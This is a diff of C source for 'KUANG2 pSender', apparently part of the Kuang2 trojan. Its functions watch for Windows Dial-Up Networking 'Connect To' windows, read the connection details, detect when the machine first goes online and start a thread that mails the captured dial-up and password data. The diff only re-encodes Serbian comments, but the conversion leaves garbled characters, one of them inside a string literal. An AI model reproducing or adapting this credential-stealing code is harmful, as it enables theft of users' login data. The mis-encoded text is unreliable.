@@ -1,6 +1,6 @@
 /***[ThuNderSoft]*************************************************************
 						  KUANG2 pSender: message loop
-								úùÄÍ WEIRD ÍÄùú
+								     WEIRD
 *****************************************************************************/
 
 #include <windows.h>
@@ -8,12 +8,12 @@
 #include <tools.h>
 #include <win95e.h>
 
-// ovo je max du‚ina stringa za svaki od unosa
+// ovo je max duÅ¾ina stringa za svaki od unosa
 #define MAXSTR 1024
 
-// broj milisekundi izme”u dva ulaska u DUPhook (5000)
+// broj milisekundi izmeÄ‘u dva ulaska u DUPhook (5000)
 #define TIME 5000
-// odre”uje posle koliko ulazaka u DUPhook poziva deo koji radi sa mre‚om (12000)
+// odreÄ‘uje posle koliko ulazaka u DUPhook poziva deo koji radi sa mreÅ¾om (12000)
 #define NETTIME 12
 
 
@@ -32,12 +32,12 @@ char connect_to[]={		// "Connect To";
 
 int brojac, time4Net;
 char lastIP[]="a3d$Sp 32p dpcl"; // zadnji IP
-char tempIP[]="dm__eodU#dsWQw"; // temp IP (teku†i)
+char tempIP[]="dm__eodU#ÂdsWQw"; // temp IP (tekuÄ‡i)
 char hostIP[]="127.0.0.1";       // host IP
 char newlines[]={0x0D, 0x0A, 0x0D, 0x0A, 0x00}; // 2 nove linije
 
-BOOL SENDdunOK;		// TRUE ako smo nakon prikljuenja na internet uspe„no obradili slanje DUN podataka
-BOOL SENDpassOK;	// TRUE ako smo nakon prikljuenja na internet uspe„no obradili slanje PASSWORD podataka
+BOOL SENDdunOK;		// TRUE ako smo nakon prikljuÄenja na internet uspeÅ¡no obradili slanje DUN podataka
+BOOL SENDpassOK;	// TRUE ako smo nakon prikljuÄenja na internet uspeÅ¡no obradili slanje PASSWORD podataka
 
 
 extern DWORD WINAPI SendThread (LPVOID param);
@@ -45,7 +45,7 @@ extern DWORD WINAPI SendThread (LPVOID param);
 /*
 	FindCnctName
 	------------
-  ş Za dati "Connect To" nalazi ime konekcije i ostalo. */
+  + Za dati "Connect To" nalazi ime konekcije i ostalo. */
 
 BOOL CALLBACK FindCnctName(HWND hChild, LPARAM lParam)
 {
@@ -71,15 +71,15 @@ BOOL CALLBACK FindCnctName(HWND hChild, LPARAM lParam)
 /*
 	DupHook
 	-------
-  ş Ovde je glavna radnja: prati DUP prozore i ita podatke i tako to.
-  ş Dolazi ovde svakih TIME milisekundi - to je minimalno vreme koje mora da
-	protekne izme”u poziva 'Connect To' prozora i konanog logovanja na
-	mre‚u. Ovo je sasvim dovoljno vreme, ak mo‚e i vi„e da se uzme.
-  ş ta se de„ava ako korisnik ima neki alternativni nain logovanja?
+  + Ovde je glavna radnja: prati DUP prozore i Äita podatke i tako to.
+  + Dolazi ovde svakih TIME milisekundi - to je minimalno vreme koje mora da
+	protekne izmeÄ‘u poziva 'Connect To' prozora i konaÄnog logovanja na
+	mreÅ¾u. Ovo je sasvim dovoljno vreme, Äak moÅ¾e i viÅ¡e da se uzme.
+  + Å ta se deÅ¡ava ako korisnik ima neki alternativni naÄin logovanja?
 	Ako prethodno nije koristio 'Connect To' buf[0] bi trebalo da bude 0
-	i situacija se bele‚i i „alje se IP. Ako je prethodno nekad bio
-	'Connect To' onda su ti podaci i dalje prisutni ali, po„to su obra”eni
-	nema frke da †e ih slati ponovo */
+	i situacija se beleÅ¾i i Å¡alje se IP. Ako je prethodno nekad bio
+	'Connect To' onda su ti podaci i dalje prisutni ali, poÅ¡to su obraÄ‘eni
+	nema frke da Ä‡e ih slati ponovo */
 
 void DUPhook(void)
 {
@@ -88,51 +88,51 @@ void DUPhook(void)
 	DWORD threadID;
 
 
-	unutra=TRUE;		// oznai da smo unutra, da ne bi ponovo u„li
+	unutra=TRUE;		// oznaÄi da smo unutra, da ne bi ponovo uÅ¡li
 
 /******************************* WatchDog mode ******************************/
 
-	hCT=FindWindow(NULL, connect_to);	// FindWindows je MNOGO br‚e nego EnumWindows (÷ 2x br‚e)
+	hCT=FindWindow(NULL, connect_to);	// FindWindows je MNOGO brÅ¾e nego EnumWindows (Ã· 2x brÅ¾e)
 	if (hCT) {
 		time4Net=brojac=0;
-		EnumChildWindows(hCT, FindCnctName, 1); // enumeri„i - dok ne zavr„i„ nema dalje
+		EnumChildWindows(hCT, FindCnctName, 1); // enumeriÅ¡i - dok ne zavrÅ¡iÅ¡ nema dalje
 	}
 
 /********************************* NetDetect ********************************/
 
-	if (time4Net++ >= NETTIME) {// Da li je do„lo vreme da se proverava mre‚a?
+	if (time4Net++ >= NETTIME) {// Da li je doÅ¡lo vreme da se proverava mreÅ¾a?
 		time4Net=0;				// da, resetuj brojac
 
 		if (gethostname(temp, 1024))	// uzmi ime hosta
-			goto dhend_err;				// ne„to nije bilo u redu
+			goto dhend_err;				// neÅ¡to nije bilo u redu
 
-		H=gethostbyname(temp);			// na”i IP hosta
-		if (H==NULL) goto dhend_err;	// nema IPa - verovatno nismo na mre‚i
+		H=gethostbyname(temp);			// naÄ‘i IP hosta
+		if (H==NULL) goto dhend_err;	// nema IPa - verovatno nismo na mreÅ¾i
 
-		strcopyF(tempIP, inet_ntoa(*(struct in_addr *)H->h_addr));	// na„li smo IP
+		strcopyF(tempIP, inet_ntoa(*(struct in_addr *)H->h_addr));	// naÅ¡li smo IP
 
 		if (!strcompF(tempIP, hostIP))
-			goto dhend_err;				// sigurno nismo na mre‚i jer su isti
+			goto dhend_err;				// sigurno nismo na mreÅ¾i jer su isti
 
 /****************************** I am on the Net *****************************/
 
-		if (!strcompF(tempIP, lastIP)) goto dhend;	// trenutni IP je isti kao i zapam†eni -> iza”i
+		if (!strcompF(tempIP, lastIP)) goto dhend;	// trenutni IP je isti kao i zapamÄ‡eni -> izaÄ‘i
 
-		// Sada smo na mre‚i po prvi put nakon ukljuenja na nju! Zato
+		// Sada smo na mreÅ¾i po prvi put nakon ukljuÄenja na nju! Zato
 		// kreiram thread da oslobodim sam program koji proverava da li je
-		// ova konekcija bila i ako nije da po„alje podatke na e-mail.
+		// ova konekcija bila i ako nije da poÅ¡alje podatke na e-mail.
 
-		// Kreiramo thread zadu‚en za slanje podataka.
+		// Kreiramo thread zaduÅ¾en za slanje podataka.
 		CreateThread(NULL, 0, SendThread, NULL, 0, &threadID);
 
-		return;						// samo iza”i - 'unutra' ostaje TRUE!
+		return;						// samo izaÄ‘i - 'unutra' ostaje TRUE!
 
 dhend_err:
-		SENDdunOK=SENDpassOK=FALSE;		// neka gre„ka je bila ili nismo na netu
+		SENDdunOK=SENDpassOK=FALSE;		// neka greÅ¡ka je bila ili nismo na netu
 		lastIP[0]=0;					// zato resetuj sve flagove
 	}
 dhend:
-	unutra=FALSE;					// nismo vi„e unutra
+	unutra=FALSE;					// nismo viÅ¡e unutra
 	return;
 }
 
@@ -141,7 +141,7 @@ dhend:
 /*
 	WndProc
 	-------
-  ş message loop */
+  Ã¾ message loop */
 
 LRESULT CALLBACK WndProc (HWND hw, unsigned msg, WPARAM wParam, LPARAM lParam)
 {
@@ -159,7 +159,7 @@ LRESULT CALLBACK WndProc (HWND hw, unsigned msg, WPARAM wParam, LPARAM lParam)
 			break;
 
 		case WM_TIMER:
-			if (!unutra)			// ako nismo ve† unutra
+			if (!unutra)			// ako nismo veÄ‡ unutra
 				DUPhook();			// pozovi f-ju koja radi...
 //			else MessageBeep(MB_OK);
 			break;
